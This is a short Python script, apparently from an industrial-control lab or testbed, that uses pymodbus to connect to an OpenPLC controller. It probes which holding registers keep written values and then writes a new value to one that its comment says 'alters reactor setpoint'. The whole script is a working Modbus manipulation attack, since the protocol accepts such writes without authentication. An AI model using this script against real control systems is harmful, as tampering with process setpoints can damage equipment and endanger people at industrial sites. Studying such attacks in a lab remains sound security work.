
from pymodbus.client import ModbusTcpClient
import time

PLC_IP = "192.168.95.2"
client = ModbusTcpClient(PLC_IP, port=502)

if client.connect():
    print("[+] Connected to OpenPLC")

    # HR 100 (%QW) - Overwritten by PLC scan cycle
    print("\n--- Testing HR 100 (%QW Output Word) ---")
    client.write_register(100, 30000)
    time.sleep(0.5)
    res = client.read_holding_registers(100, count=1)
    if not res.isError():
        print(f"HR 100 Readback: {res.registers[0]} (Recomputed by PLC if 65535)")

    # HR 1026 (%MW) - Internal memory setpoint space
    print("\n--- Testing HR 1026 (%MW Memory Word) ---")
    target_sp = 45000  # Alters reactor setpoint
    client.write_register(1026, target_sp)
    time.sleep(0.5)
    res_sp = client.read_holding_registers(1026, count=1)
    if not res_sp.isError():
        print(f"HR 1026 Readback: {res_sp.registers[0]} (Holds value if write succeeded)")

    client.close()
else:
    print("[-] Connection to OpenPLC failed")

